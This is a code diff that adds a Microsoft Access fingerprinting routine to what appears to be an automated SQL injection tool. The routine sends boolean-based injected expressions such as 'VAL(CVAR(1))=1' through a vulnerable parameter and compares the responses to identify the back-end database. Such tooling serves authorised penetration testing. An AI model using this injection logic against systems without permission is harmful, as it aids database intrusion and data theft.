@@ -213,6 +213,83 @@ class FingerPrintDBMS:
                 _temp = "MySQL"
         return _temp
 
+    def check_access(self, heuristic_backend_check=False):
+        _temp = ""
+        if heuristic_backend_check:
+            attack = self.check_boolean_expression(expression="VAL(CVAR(1))=1")
+            attack01 = self.check_boolean_expression(
+                expression=quote(
+                    "IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0",
+                )
+            )
+            bool_retval = check_boolean_responses(
+                self.base,
+                attack,
+                attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
+            result = bool_retval.vulnerable
+            if result:
+                is_ok = False
+                if self._attacks:
+                    t0, f0 = self._attacks[0].status_code, self._attacks[-1].status_code
+                    t1, f1 = attack.status_code, attack01.status_code
+                    r0, r1 = self._attacks[0].redirected, attack.redirected
+                    is_ok = bool(t0 == t1 and f0 == f1 and r0 == r1)
+                if is_ok:
+                    message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}Microsoft Access{nc}'"
+                    logger.notice(message)
+                    _temp = "Microsoft Access"
+        else:
+            logger.info(f"testing Microsoft Access")
+            attack = self.check_boolean_expression(expression="VAL(CVAR(1))=1")
+            bool_retval = check_boolean_responses(
+                self.base,
+                attack,
+                self.attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
+            result = bool_retval.vulnerable
+            ok = False
+            if result:
+                logger.info(f"confirming Microsoft Access")
+                attack = self.check_boolean_expression(
+                    expression="IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"
+                )
+                bool_retval = check_boolean_responses(
+                    self.base,
+                    attack,
+                    self.attack01,
+                    match_string=self.match_string,
+                    not_match_string=self.not_match_string,
+                    code=self.code,
+                    text_only=self.text_only,
+                )
+                result = bool_retval.vulnerable
+                if not result:
+                    warnMsg = "the back-end DBMS is not Microsoft Access"
+                    logger.warning(warnMsg)
+                    ok = False
+                    return ""
+                if result:
+                    ok = True
+            else:
+                warnMsg = "the back-end DBMS is not Microsoft Access"
+                logger.warning(warnMsg)
+                ok = False
+                return ""
+            if ok:
+                logger.notice("the back-end DBMS is Microsoft Access")
+            if ok:
+                _temp = "Microsoft Access"
+        return _temp
+
     def check_mssql(self, heuristic_backend_check=False):
         _temp = ""
         db_version = ""
